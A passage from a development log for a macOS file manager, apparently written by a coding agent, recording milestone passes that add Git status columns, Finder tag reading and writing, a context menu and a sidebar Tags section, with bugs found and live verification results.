      tag dots — again where Finder puts it (measured, pass 16); ubiquity attrs where available

Exit: git repo browsing shows live status; a user-defined "convert to webp" script on
selection runs from the palette.

Progress (2026-07-15, M6 pass 1 — the Git-awareness core): the pure, tested foundation of the Git
item landed, the same core-first opener every M4/M5 slice used. Box stays `[ ]` (no provider, no
column, no path-bar branch, no app wiring yet) — this is the parse/lookup half. **Four new
`DirnexCore/Services/` files, purely additive** (no existing-API changes, so the app is untouched and
needs no rebuild). Method note: `git`'s real output was **probed live before any Swift was written**
(the pass-7 lesson — `SFTPListingParser` had to be reworked because its format was assumed, not
observed), which caught three things a from-memory parser gets wrong:
- **`GitStatus.swift`** — `GitFileStatus` (`unmodified/modified/added/deleted/renamed/untracked/
  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the colour, this picks
  the character) + `GitStatusEntry` (one porcelain record: `relativePath` + **both** of Git's axes,
  `indexStatus`/`worktreeStatus`, kept verbatim so a later tooltip can say "staged edit plus unstaged
  edits on top" without re-parsing) + `GitBranch` (name/upstream/ahead/behind/isDetached/
  hasNoCommits, for the path bar). `entry.status` collapses the two axes into the one value a column
  renders: untracked/ignored/unmerged are whole-entry verdicts and answer first; otherwise the
  **index column wins when set** (`AM` — staged new, then edited — reads "added", which is more use
  to someone browsing a folder than "modified"), else the worktree column (the common ` M`/` D`).
  Every unmerged shape (`UU`/`AU`/`UA`/`DU`/`UD`/`AA`/`DD`) is one `.conflicted`.
- **`GitStatusSnapshot.swift`** — the per-row lookup a panel does while rendering, so `status(for:)`
  is O(1) and all the work happens once at construction. **(1) Directory roll-up**: Git reports files,
  panels also show the folders holding them → every entry's ancestors are pre-merged by
  `rollupPrecedence` (conflict > modified > added > deleted > renamed > untracked > ignored), so a
  folder advertises the loudest thing inside it. **`.ignored` deliberately does NOT roll up** — a
  source folder holding one ignored `debug.log` is not itself ignored, and painting it `!` would say
  exactly that. **(2) Collapsed-directory inheritance**: Git emits `build/` and says *nothing* about
  the files inside, so a lookup that misses falls back to the nearest untracked/ignored ancestor and
  the contents still read as ignored once you navigate in. **(3)** The repo root itself is never
  painted (its roll-up would mark the `..` row of every dirty repo).
- **`GitStatusParser.swift`** — `-z` output → snapshot. **`-z` is the whole point**: without it Git
  *quotes* any path with a space or a non-ASCII byte (`"caf\303\251.txt"`) and the parser would have
  to reimplement C-string unquoting; with it every field is raw bytes. The cost is two traps, both
  found by probing: **(a) the rename pair** — `-z` emits `R  <new>` NUL `<old>` NUL, i.e. the *reverse*
  of the printed `old -> new`, so reading them in the printed order names every renamed row after the
  file that no longer exists; **(b) the branch header** is NUL-terminated like any entry, not a line.
  Four header shapes captured live and pinned: `main` · `main...origin/main [ahead 1, behind 1]` ·
  `HEAD (no branch)` · `No commits yet on main` (splitting on `...` is unambiguous — refname rules
  forbid `..` in a branch). Malformed fields are skipped, never thrown on: a snapshot missing one
  exotic row still renders a useful panel, whereas throwing blanks the whole column.
- **`GitRepository.swift`** — `repositoryRoot(for:exists:)` walks up for `.git`, **nearest first** (a
  submodule/nested repo wins, matching what `git` itself reports from there), with the filesystem
  reduced to an injected `exists` probe (`ExternalDiffTool`'s shape) so discovery is tested without a
  repository. The probe must be a **plain existence check**: `.git` is a regular *file* in a linked
  worktree or submodule, and a directory check would silently drop Git awareness exactly where people
  use worktrees. `GitCommand` pins the argv (like `SFTPProcessArguments`): **`--no-optional-locks`**
  (a plain `git status` opportunistically rewrites the index under `index.lock`; a poller doing that
  behind the user's back races their own git commands and can fail *their* rebase — this makes the
  read side-effect-free, the same reason editors pass it), `--porcelain=v1 --branch -z`, and
  **`--ignored=traditional`** (one collapsed row for `node_modules/` instead of a hundred thousand).
  **`/usr/bin/git` is deliberately NOT a candidate executable**: it is Apple's `xcrun` shim, and
  spawning it without the Command Line Tools installed pops a modal "install developer tools?" dialog
  — a background poller must never be able to do that to someone who just opened a folder. Candidates
  are Homebrew → CLT → Xcode; none installed ⇒ Git awareness stays off and the column stays blank
  (the same graceful degradation as no diff tool installed).
FINDING (documented, changed the code): the anticipated **unicode trap is a non-issue in Swift** —
macOS hands back decomposed names (`e`+U+0301) while Git, with `core.precomposeunicode` (on by
default), reports the precomposed form, so the two spell one file with different bytes (verified:
their UTF-8 differs). But Swift's `String` compares *and hashes* by **canonical equivalence**, so the
keys are interchangeable in the dictionary for free. The first draft normalized every key with
`precomposedStringWithCanonicalMapping` — which was not just redundant but a **fresh allocation on
every row lookup** in a 100k-row panel's hot path. Removed; a test pins the property instead, since
it is load-bearing and would break in any byte-keyed language.
+63 tests → **544 core tests** (was 481): the parser suite is anchored on a **golden fixture of the
exact bytes captured from git 2.50.1** against a scratch repo built to hold every shape at once.
`swift test` green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE against real repositories**
(a throwaway harness compiled against the core, driving the real `git` binary through `GitCommand`):
the scratch repo parsed every shape incl. the rename-source pairing; the four branch shapes each
confirmed on a purpose-built repo (fresh → `noCommits`, a clone → `ahead=1 behind=1`, detached →
detached); and **Dirnex's own repo** reported branch `Dev` / upstream `origin/Dev` (matching
`git rev-parse`) with the roll-up painting the top-level `DirnexCore` row `?` from files nested four
levels deep, and `.claude`/`build` collapsed to single ignored rows. The NFD-vs-NFC match was proven
live too — the on-disk decomposed name resolved against Git's precomposed key through the real
filesystem. **NEXT (M6 pass 2, the app layer):** a `GitStatusProvider` (`Process`-driven, **debounced**,
off-main, cached per repo root, refreshed on FSEvents + directory change — mirroring
`SpotlightSearchRunner`/`ArchiveMounter`), the **status column** in the panel (per-tab, like the other
columns) and the **branch in the path bar**; then the optional `.gitignore`-aware folder sizes.

Progress (2026-07-15, M6 pass 2 — the app layer; **the Git box closes `[x]`**, only the item's own
"optional" `.gitignore`-aware folder sizes deferred). Three new app files plus one split, and no core
change at all (pass 1's 544 tests stand untouched):
- **`GitStatusProvider.swift`** — spawns `git` off-main through pass 1's `GitCommand`, parses with
  `GitStatusParser`, caches one snapshot per **repository root** (LRU, 8). Shared, not per-pane,
  because the unit of caching is the repository: two panes in one working tree must get one answer
  from one run. **Rate limiting is the whole design, not a nicety** — in a repository the FSEvents
  never stop (a build writes thousands of files, a checkout rewrites the tree), so a request is
  either coalesced into a 300 ms trailing window or, when the snapshot has already been stale for
  2 s, run immediately: a pure trailing debounce starves under a long build's continuous churn and
  would freeze the column for its duration. Runs are serialized per root (a request arriving mid-run
  is replayed once, never spawned alongside). **Pass 1's `--no-optional-locks` turns out to be what
  makes any of this terminate**: without it our own `git status` would rewrite `.git/index`, FSEvents
  would report that as a change, and the pane would ask for another refresh — a spawn loop fed by
  nothing but our own reading.
- **BUG, caught reviewing before the live run:** the "a first look runs immediately" test asked *do
  we have a snapshot*, but a repository `git` refuses to read (dubious ownership, a corrupt index)
  caches none — so every event would count as a first look and spawn `git` again, precisely the storm
  the rate limiting exists to prevent. It now asks *have we ever run this* (`lastRun`), and `forget()`
  deliberately keeps the run stamp when it drops the snapshot; only LRU eviction clears it, which
  correctly makes an aged-out repository a first look again.
- **`PanelViewController+Git.swift`** — per-*tab* root + snapshot (so a tab switch restores the Git
  view along with everything else), per-*pane* watcher. **The pane's existing directory watcher is
  blind to exactly the changes Git status turns on**: `git add` in a terminal, a branch switch, an
  edit in a sibling folder all change what these rows should say while touching nothing under the
  folder on screen — the index and `HEAD` live at the root. So the Git side watches the **root**
  instead, and every pane in that repository coalesces onto the provider's one debounced run. The
  watched root is tracked on the pane, not read back from the tab: a tab switch can leave the tab's
  root unchanged while the pane's watcher was torn down for the other tab (a nil-watcher hole the
  first draft had).
- **The gutter is a *contextual* column** (`Column.isContextual`): a permanently blank "Git" column in
  every folder that isn't a repository — most of them — is clutter, so it exists only inside one,
  sits right after Name, fixed at 20 pt, unsortable (`sortKey` became optional), header "" plus a
  `headerToolTip`. It is **paid for out of the Name column**, never added on top of the table —
  caught by the user on review of the first cut, which appended it and so shoved Size and Date
  sideways on every step into a repository, moving columns they had placed deliberately for a reason
  that has nothing to do with them. Name is the right column to charge because it is already the one
  that absorbs slack (`firstColumnOnlyAutoresizingStyle`); a filename with less room is a truncation,
  not a rearranged pane. (The alternative — drawing the status inside the name cell, VS Code-style —
  was rejected: text colour there is already taken by the mark's bold red and the hidden-file dim,
  and inline rename (F2) replaces that cell's text field with an editable box a badge would have to
  dodge. It would reserve the same 20 pt anyway.) **GOTCHA, and the reason the first fix still
  drifted ~17 pt: `intercellSpacing.width` is 17 pt at this table's `.plain` style, not the 2–3 pt
  the name suggests.** A column costs `width + intercellSpacing`, so the carve must be 37, not 20 —
  established by probing a throwaway `NSTableView` configured exactly like the pane (the same
  measure-don't-assume move as pass 1's `git` probing; the frame returned to its baseline 541.5 only
  once the spacing was included) and read live from the table rather than hardcoded. That is only
  safe because **it never enters a stored layout**: `defaultColumnLayout`
  excludes it and `currentColumnLayout` filters it out, or else every step into a repository would
  look like the user rearranging their columns — and be persisted as such. That same capture also
  **adds the footprint back onto Name**, since while the gutter is installed Name is physically that
  much narrower: storing the carved width would ratchet Name 37 pt smaller on every trip through a
  repository. `applyColumnLayout` lifts the gutter out before the reorder pass and re-installs after:
  that pass moves each stored column to its target index in turn, which drags an unlisted column to
  the far end one move at a time.
  `FileCellView.accentColor` carries the status colour — it outranks the mark's red (a marked
  modified file still shows an orange `M`) and yields to the cursor's emphasized background.
- **BUG the user caught, and the reason the pane has `renderRefresh` at all:** the snapshot-arrived
  path hand-rolled `tableView.reloadData()`, which drops the table's selection — so **crossing a
  repository boundary silently deselected the row**, `..` included. It only ever showed at a
  crossing, because that is the only time the snapshot *changes* (nil ⇄ snapshot); walking around
  inside one repository re-uses it and never reloads. The fix is to stop hand-rolling: an arriving
  snapshot is a live background change like FSEvents or a directory-size total, so it goes through
  `renderRefresh()`, which re-anchors the cursor from the model (the `..` row lives only in
  `cursorOnParentRow`, which the model cannot restore for you) and pointedly does *not* scroll.
  Sobering detail: this was **visible in the pass's own verification screenshots** — every repo pane
  had no highlighted row while the home folder did — and went unnoticed until the user pointed at it.
  A screenshot only verifies what you actually look at.
- **`GitBranchChipView.swift`** — glyph + name + `↑2 ↓1` only when drifted, with a tooltip spelling it
  out. Deliberately **inert**: a click here would be an offer to switch branches, and the only thing
  worse than no Git operations in a file manager is Git operations where a misclick rewrites the
  worktree. It rides *inside* the crumb stack (after the greedy spacer) rather than pinned to the
  bar's edge — `NSStackView` collapses a hidden arranged view, whereas a hidden pinned one keeps
  reserving its width: a branch-shaped hole in the path bar of every folder that isn't a repo.
- GOTCHAS (both recurring, both already on the list): `PathBarView` sat at 496 of the 500-line
  `file_length` limit, so the chip forced splitting the location rendering into
  `PathBarView+Location.swift` — which immediately hit **"Swift `private` doesn't cross files"**
  (`installVirtualLabel` touches the private `crumbStack`), fixed by keeping it beside `installCrumbs`
  and widening only `rebuildCrumbs` to internal. Also swiftlint's `optional_data_string_conversion`
  rejects `String(decoding:as:)` — disabled in place with the reason: the failable initializer it
  prefers answers `nil` for the *whole* output on one non-UTF-8 filename, blanking the column for
  every other row, where lossy decoding costs only that row's key.
+9 app tests → **33** (the hermetic surface: how a branch reads, and the contextual-column invariant;
the subprocess/cache half is non-hermetic and verified live, as with `SMBMounter`). 544 core + 33 app
green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE** against a purpose-built repo holding
every shape at once with a real upstream: the root painted `build` `!` · `deep` `M` (rolled up from a
file **four levels down**) · `scratchdir` `?` (collapsed untracked dir) · `src` `M` (precedence:
modified beats the deleted/renamed/untracked also inside it) · `debug.log` `!`, with `..` blank and
the chip reading `main ↑1 ↓1`; inside `src/`: `added.txt` `A`, `edited.txt` `M`, **`renamed.txt` `R`**
— which proves pass 1's reversed `-z` rename pair end-to-end, since the printed order would have
painted the name that no longer exists — clean files blank, `untracked.txt` `?`. Then **live, with no
navigation**: `git add src/untracked.txt` (an index-only change, nothing under the folder on screen)
flipped `?`→`A`, which is the root watcher earning its existence, and `git checkout -b
feature/live-check` retitled the chip and dropped the arrows. Crossing to **Dirnex's own repo**
re-derived root/snapshot/branch/watcher (`Dev`; `Dirnex` `M`, `DirnexTests` `?`, `DirnexCore` blank —
matching exactly what this pass had touched); leaving for `~/Downloads` took the gutter and chip away;
the right pane never grew a column while the left had one; and the persisted layout after all of that
was still `name`/`size`/`date` alone. Incidental confirmation of a pass-1 decision: this Mac has **no
Homebrew git**, so the CLT candidate is what resolved — and `/usr/bin/git`, excluded as the `xcrun`
shim, is exactly what a naive provider would have spawned. Re-verified after the Name-carve fix: the
Size and Date headers sit at **identical** positions inside and outside a repository (only Name's
sort indicator moves), and four crossings in a row left the stored width at exactly 250.5. Re-verified
after the cursor fix, all four crossings: Cmd+L into a repo keeps the cursor on the first row, Enter
on `..` out of one lands on the folder you came from, and a snapshot landing *on top of* a cursor
parked on `..` (forced by creating an untracked file from a terminal) leaves `..` selected while the
new `?` row appears beneath it.
**NEXT (M6 pass 3):** Finder tags (column, edit from panel, filter chips in search), then the
terminal drawer / size-visualization mode.

Progress (2026-07-15, M6 pass 3 — the Finder-tags core): the pure, tested foundation of the tags
item, the same core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no column, no editor, no
chip UI — this is the value/parse/read-write half). **Two new `DirnexCore/Services/` files plus one
additive field on `SpotlightQuery`.** Method note, and it paid for itself repeatedly: **the stored
format was probed against real tagged files before any Swift was written** (the pass-1 `git` lesson,
and the pass-7 `SFTPListingParser` rework that came of *assuming* a format). Every claim below was
observed, and the first draft of nearly all of them would have been wrong:
- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + colour, parse/
  serialize) + `FinderTagPayload` (the attribute's binary-plist array). The format is
  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolourIndex` strings**.
  Traps found by probing: **(a) the colour indices are not Finder's display order** — `FavoriteTagNames`
  reads Red, Orange, Yellow, Green, Blue, Purple, Grey, which looks like the enumeration and is not
  it; the real mapping (0 none · 1 Grey · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
  was established by letting the system assign each colour itself from a bare name. `Grey` resolves,
  `Gray` does not. **(b) A third field exists in the wild**: passing an already-suffixed `Red\n6` to
  `URLResourceValues.tagNames` makes the system treat the *whole string* as the name and append its
  own lookup, storing `Red\n6\n0` — my own first probe wrote corrupt tags this way and they looked
  right. The system reads such rows back as plain `Red`, so fields past the colour are ignored here
  too. **(c) The colour field is optional** (a bare `Plainname` round-trips), and the system always
  *emits* it, `\n0` included — so we emit what it emits. Identity is the **name, case-insensitively**,
  which is the system's own rule (writing `red` stores `red` but resolves to Red's 6), and matches the
  `SavedSearch`/`ServerConnection` name-as-identity precedent. Malformed rows are skipped and a
  nonsense colour degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
  bad row must not blank the cell. Duplicates collapse (the system does **not** dedupe on write).
- **`FinderTagStorage.swift`** — the local xattr read/write, in core beside `ByteComparator` per §2.
  **Why it writes the attribute by hand rather than calling `URLResourceValues.tagNames`, the
  documented API — two independent reasons, either sufficient: (1) its setter is macOS 26+ and
  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a colour** — it
  takes bare names and looks each up in a global database that a write of ours never registers into,
  so expressing an edit through it strips the colour off every custom tag on the file (probed: after
  storing a purple `Zebra`, `tagNames = ["Zebra"]` writes `Zebra\n0`). A data-loss bug wearing the
  documented API's clothes. The getter is available on 14 but drops colours, so it is no use for a
  column either. The one thing the API does that we then must do ourselves is **keep the legacy
  `com.apple.FinderInfo` label byte in sync** — probed: `tagNames = ["Red"]` leaves Spotlight
  reporting `kMDItemFSLabel = 6` where a raw write leaves 0, and the selection rule is **the last
  *coloured* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
  colourless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
  codes belonging to whoever wrote them.
- **`SpotlightQuery.tags`** — the chip's pure half; the file's own header comment had anticipated it
  since M4. One `kMDItemUserTags == "Name"c` clause **per tag, ANDed** (kinds OR because a second kind
  broadens; a second tag narrows — the overlap is what the user is asking for). Only names, because
  only names are indexed. **BUG caught while adding it:** `SpotlightQuery` is `Codable` and persisted,
  so a synthesized decoder would throw on the M4-era saved searches that have no `tags` key — which
  would not fail loudly, it would **empty the user's Searches sidebar on upgrade**. Hand-rolled
  `init(from:)` with `decodeIfPresent`, pinned by a test against a literal legacy payload.
MEASURED, and it decides the app pass's architecture: **one `getxattr` costs ~10 µs, tagged or not →
~1 s across a 100k-row directory**, against M1's 150 ms budget for opening one. So tags must **not**
be folded into `LocalBackend.listDirectory`; the column gets the `GitStatusProvider` treatment — off
main, cached, filled asynchronously. (Per *selection* it is nothing, so editing reads inline.)
+44 tests → **588 core tests** (was 544), the payload suite anchored on a **golden fixture of the
exact bytes macOS wrote** for a real tagged file. `swift test` green, swiftformat + swiftlint-strict
clean; app target untouched (new files + one additive field, so no rebuild needed).
**VERIFIED LIVE** — a harness compiled against the real core wrote tags into a real folder, then
**Finder itself** was the judge: the stock `Red` painted a red dot, a custom **purple `Zebra` + `Blue`
rendered as Finder's two-tone split dot**, a colourless `Work` correctly drew **no** dot and left no
FinderInfo record, an incremental add+remove (case-insensitive) preserved the custom purple, Get Info
listed the names, `kMDItemFSLabel` read **6** where a naive raw write leaves 0, and **Spotlight
indexed our tags** — the exact predicate `SpotlightQuery` builds, run verbatim through `mdfind`,
found the file (the search chip, end-to-end). All artifacts removed after.
**FINDING that shapes pass 4, and the reason to look rather than assume:** mid-verification Finder
**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a colour. It is not
reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honoured, and rendered orange
in both the dot and the Get Info chip. The consistent explanation: **a colour belongs to the *name*,
system-wide, not to the file** — the system's name → colour database is authoritative, and Finder
reconciles a file's stored copy against it, so `Zebra`, which my own earlier probes had registered as
colourless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a colour
when *introducing* a tag, but must not present per-file colour as the user's to own — re-colouring
one file's `Work` is not a change macOS keeps. (Exact trigger not pinned down; it is Finder's
business, and the engineering conclusion holds either way.)
**NEXT (M6 pass 4, the app layer):** a `FinderTagProvider` mirroring `GitStatusProvider` (off-main,
cached, FSEvents-refreshed — the ~10 µs/row measurement is why), the **tag column** (dots, and
contextual-vs-always-on is the open question: unlike Git, tags aren't scoped to a repo, so a
permanently-blank column for people who don't tag would be the Git gutter's mistake in reverse),
**editing from the panel** (a tag menu over the selection, offering the seven stock tags + the names
already in use), and the **filter chips** in the search sheet.

Progress (2026-07-15, M6 pass 4 — the Finder-tags app layer): **the box is closed, VERIFIED LIVE.**
Four new app files, one generalized out of the Git pass, and no core change beyond two catalog
commands — the pass-3 core was already the right shape.

**The open question, answered by the user: a View toggle (`Show Tags`), defaulting on** — not the Git
gutter's contextual rule. The rule was tempting (it is right there, tested, one line to reuse) but its
*justification does not transfer*, which is the whole finding: a repository is a coarse, stable
property of a whole subtree, so the gutter appears once on the way in and stays; tagged files are
**scattered**, so the identical rule would install and remove the column — and re-truncate every
filename, since a gutter is paid for out of Name — on nearly every step between sibling folders. A
precedent is an argument, not a licence. The preference is still ANDed with "could these rows carry
tags at all" (local files, and search hits, which are local files in a virtual pane): inside an
archive or on SFTP the column could only ever be blank, which is what the preference exists to avoid.
The checkmark tracks the *preference*, never that derived state — unchecking the box inside a zip
would blame the user's setting for the filesystem's limits.
- **`PanelViewController+ContextualColumns.swift`** — the Git pass's install/footprint/carve
  machinery, lifted out and generalized, because **a second gutter would have silently broken the
  first**: `currentColumnLayout` reclaimed `gitColumnFootprint` specifically, so with two installed it
  would refund half of what it charged and Name would ratchet narrower on every capture — the exact
  bug the reclaim exists to prevent, just slower. Now sums over all installed gutters. Insertion keeps
  `Column.allCases` order among them (Name │ git │ tags │ Size │ Date) whichever arrives first, so
  installing one never reshuffles another. `Column` gained `headerToolTip` (both gutters are too
  narrow to title).
- **`FinderTagProvider.swift`** — `GitStatusProvider`'s shape (off-main, LRU 8, 300 ms debounce or
  run-now past 2 s stale, serialized per key, published by notification) for the reason the core
  *measured*: ~10 µs per `getxattr` is ~1 s across a 100k-row directory. **What differs and why:** its
  unit of caching is the *repository* because one `git status` answers for a whole tree; there is no
  such command for tags, so the unit is the **directory** and the caller passes the paths. The pane
  passes its **whole listing, not its visible rows** — two panes on one folder can have different
  hidden/filter settings, and a scan of the narrower one would evict rows the other still shows,
  leaving tagged files looking untagged. `knownTagNames` accumulates as you browse (there is no API
  for "the user's tags"; the system's list is Finder's own synced plist, not a contract) and feeds
  both the editor menu and the search completion — verified live: `Urgent`, met in one tab, was
  offered in another. **`FinderTagSnapshot.==` is hand-rolled and must be**: `FinderTag`'s own `==`
  compares names case-insensitively and **ignores colour** — correct for identity, wrong for "did the
  pixels change" — so the synthesized version would answer "equal" when Finder recoloured a tag (which
  pass 3 documented it doing *by itself*) and the column would keep painting the old dot.
- **`PanelViewController+Tags.swift`** — per-tab snapshot, install, row lookup. **No watcher of its
  own, unlike Git**: the Git side had to watch the *repository root* because `git add` in a terminal
  changes what rows say while touching nothing under the visible folder; a tag has no elsewhere — it
  is an attribute **on the file** — so the pane's existing directory watcher already fires for it.
  Verified live (a new file appeared and rescanned with the rest).
- **`TagCellView.swift`** — custom-drawn dots; the content *is* the colour, so it borrows neither
  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgement calls: a **colourless
  tag draws a hollow ring** where Finder draws nothing — Finder can afford that because its dots sit
  beside the name, so absence reads as "no colour", whereas in a column of its own it would read
  "untagged", a lie about a file the user did tag; and on the cursor's emphasized row every dot is
  **ringed in the selection's text colour**, or a blue tag vanishes into blue.
- **`PanelViewController+TagEditing.swift`** — ⌃T (free; ⌘T is New Tab, and ⌃D/⌃Q are where this app's
  popups already live) drops a menu over the cursor row: stock seven + names in use, `.on`/`.mixed`
  per how many targets carry each, toggle across the selection, New Tag…, Remove All Tags. Targets are
  filtered **per entry** (`.local`), not per pane — which is what lets tagging work from a search
  results tab, and makes a mixed selection tag what it can. **The menu offers a colour only when
  *introducing* a name**, per pass 3's finding that colour belongs to the name system-wide: offering
  per-file colour would be offering an edit macOS silently reverts.
- **Search chips** — an `NSTokenField` (a tag *is* a token; it rounds each name into a deletable chip
  and completes against `knownTagNames`). Read via **`stringValue`, not `objectValue`**: the latter
  holds only *tokenized* chips, so a tag typed without a trailing comma would not merely be dropped
  from the search — with a tag as the only term, `isEmpty` would leave **Find disabled** and the
  search unrunnable. Flagged as a risk while writing, then confirmed live both ways.

**BUG FOUND LIVE, and it is the Git pass's own lesson repeating:** ⌘A-then-⌃T dropped the menu at the
*bottom* of the pane, clipped and scrolling. I had anchored on `tableView.selectedRow` — but marks are
independent of the cursor here, so marking everything leaves the table with **no selected row**,
`selectedRow` answers -1, and the `visibleRect` fallback resolves to the pane's lowest edge (the table
is flipped, so `maxY` is the bottom). Fixed to anchor on the **model's** cursor, which always exists
and is the only source that knows about the `..` row. Same root as pass 2's `reloadData` bug: *the
table is a renderer; the model is the truth.*

**VERIFIED LIVE** end-to-end, with macOS itself as the independent judge on both ends — the fixtures
were tagged by **Apple's own writer** (`URLResourceValues.tagNames`, available on this macOS 26 box
though not on Dirnex's 14 floor) and our writes were read back through **Apple's own getter**, which
saw exactly what we wrote. Confirmed: every dot case (stock, multi, 3-dot cap from five, hollow ring
for a colourless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*coloured*-tag-wins rule
pass 3 documented, maintained by our hand-written label; a purple `Milestone` across a 6-file marked
set **preserving the existing `Quokka\n0` verbatim** (the exact data loss `tagNames` would have
caused, which is why the core writes by hand); the mixed `−` state; completion offering a custom name
learned by browsing; the chip narrowing `mdfind` to the one file carrying `Urgent`; **dots in the
results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T greyed out; the
toggle taking both panes live; and **both gutters coexisting in the Dirnex repo itself** (Name │ `M`/`!`
│ dots │ Size │ Date). The layout invariant was checked in the persisted store, not by eye: after
repeated toggles and tab switches Name stayed **exactly 279.5** and no `tags` entry ever entered a
stored layout. 588 core + 33 app tests green, swiftformat + swiftlint-strict clean. Test artifacts
removed. Gotcha, recurring: the 4-line hookup tipped `PanelViewController.swift` to **501/500 lines**
(`file_length`) — paid for by tightening my own comment rather than widening a `private` across a
file split, which is the trap that costs more than it saves.

Progress (2026-07-15, M6 pass 5 — tags in the name cell, and the missing right-click menu): user
review of pass 4 killed the tag *column* outright and asked for Finder's actual arrangement, plus the
context menu the app had never had. Both done, VERIFIED LIVE.

**The column is gone; the dots ride at the right edge of the name.** This is the better design and the
user was right to ask for it, but note what it retires: the whole preference question pass 4 agonized
over (contextual vs always-on vs a toggle) was an artefact of the dots *being a column* — a column
must be present or absent for the whole pane, so it had to be blank for non-taggers or jitter. Inside
the name cell the question dissolves: an untagged row draws nothing and gives its name the full width,
so tags cost exactly the rows that have them. `showTags` survives as a plain on/off (the dots are
still someone's clutter to refuse) and `areTagsVisible` still ANDs in "could these rows carry tags",
but the elaborate justification is gone with the column. **Pass 4's generalization of the contextual-
column machinery went with it** — it existed only to host a second gutter, so `+ContextualColumns` was
deleted and `+Git`/`+Columns` restored verbatim from 42e88f2. A generalization with one client is just
a longer way to write the client. **The Git gutter keeps its column and should**: it is *text*,
competing for the name field's colour with the mark's red and the hidden-file dim, and F2 swaps that
field for an editor — none of which applies to a view that draws its own dots.
- **`TagDotsView`** (was `TagCellView`) — an `NSView` inside `FileCellView`, right-aligned, sized by
  `intrinsicContentSize` so Auto Layout hands the name whatever the dots don't need. The name's
  compression resistance is lowered so a long filename truncates *before* the cluster instead of
  running under it. F2 clears `tags` for the row being renamed (a *hidden* view still holds its
  width, so hiding is not enough) — nothing to restore, since the next render sets them like every
  other recycled-cell property.
- **The layout is Finder's, measured not guessed** — a file tagged `Red, Green, Blue, Yellow` was
  written by the system, opened in Finder and zoomed into, and both findings contradict the obvious
  draft: **the dots run in reverse** (the *last* tag is leftmost and whole, each earlier one peeking
  out behind it to the right — the same last-wins precedence the core found in the legacy label byte),
  and they **overlap by ~two thirds**, so five tags stay a compact cluster. The thin gap between dots
  is punched with `.destinationOut` on the view's **own layer** (hence `wantsLayer`): it erases only
  our dots, so the row's real background shows through — a stroke in a fixed colour cannot work,
  because the background is alternating-or-blue and not ours to know.
- **The context menu** (`PanelViewController+ContextMenu`) — the app had none at all. Built from
  `CommandCatalog` via `MainMenuBuilder.commandItem` (made internal), so a right-click item and its
  menu-bar twin cannot drift; nil targets mean `validateMenuItem` greys them out for free (Paste with
  an empty clipboard, everything mutating inside an archive). Two menus: one over an entry, one over
  the empty space (folder-scoped: New Folder, Paste, Add to Favorites, Synchronize). **Tags is a
  submenu**, rebuilt on open via `NSMenuDelegate` and sharing ⌃T's item builder (`tagMenuItems`) so
  there is one definition of what the tag menu contains. Right-click **takes focus first** — items
  dispatch through the responder chain, so without it a right-click in the inactive pane would run
  against the other one.
- **Retargeting, and the bug in it (found live).** Marks outrank the cursor here, so right-clicking a
  row *inside* the marked set acts on the set, while right-clicking *outside* it collapses onto that
  one row — else you point at one file and operate on others. My first cut called `syncCursorToTable`
  + `updateChrome`, which updated the footer and the cursor but **not the rows**: the footer said
  "7 items" while five rows still rendered bold red, a menu about to act on one file over a pane
  drawing five as chosen. `renderRefresh` fixes it. Third time this pass has been the same lesson —
  *the model changed, and the table is only a renderer.*

**VERIFIED LIVE:** dots identical to Finder's for 1/2/5-tag files (`report.pdf` [Red, Blue] → whole
blue leading, red sliver behind, exactly like the probe's `two.txt`); a long name truncating with an
ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colourless `Quokka`;
adding Green from the right-click **submenu** and watching it become the new lead dot; the entry menu,
the background menu, Paste correctly greyed; right-click inside the marked set keeping all 7; and
right-click outside it collapsing to the clicked row with **every red mark cleared**. 588 core + 33
app tests, swiftformat + swiftlint-strict clean, artifacts removed.
**NEXT (M6 pass 6):** the terminal drawer, or size-visualization mode — the next two `[ ]` items.

Progress (2026-07-15, M6 pass 6 — the sidebar's Tags section): user asked for Finder's Tags list in
the sidebar, gated on View ▸ Show Tags. VERIFIED LIVE. The Finder-tags box was already `[x]`; this is
a follow-on that needed **no new panel code at all** — a tag row is a *search*, not a place, so a
click runs `SpotlightQuery(tags:)` through the same `performSearch` a saved search uses and lands a
results tab titled with the tag. Sections now read Searches / Favorites / Volumes / Servers / **Tags**
(last, where Finder puts it). New `SidebarViewController+Tags.swift`, mirroring the `+Searches` /
`+Servers` split — the main file was 453 lines against the 500 limit, so only the `Row` cases and the
two stored properties an extension cannot hold (`showsAllTags`, `renderedTagNames`) landed there, and
`rebuild()` had to widen to internal (Swift `private` doesn't cross files — the recurring gotcha).
- **`FinderTagColor.displayOrder` (core, +2 tests → 590).** The section needed the order Finder
  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Grey); `allCases` is raw-value order, which is
  Apple's storage indices — it opens on Grey and buries Red. The core had already documented the
  distinction in prose and an existing test even spelled the display order out as a **local literal**
  to assert the indices aren't it; that literal is now the property, so the test pins the real thing.
  `FinderTag.systemTags` (the stock seven, in that order) is the list both the sidebar and ⌃T offer.
- **The ⌃T menu was listing them Grey-first**, while its own comment claimed "that is the order Finder
  lists them" — false since pass 4, and invisible because nobody reads a menu's order as a bug. Now
  shares `FinderTag.systemTags`, so the comment is true and the two surfaces agree.
- **The provider learns *colours*, not just names.** `knownTagNames: Set<String>` became a private
  `[String: FinderTag]` keyed by the lowercased name — which is the shape of the truth the core
  established (a colour belongs to the *name*, system-wide; Finder keeps exactly such a database), so
  the latest sighting wins. Without it every custom tag in the sidebar would draw as a hollow ring;
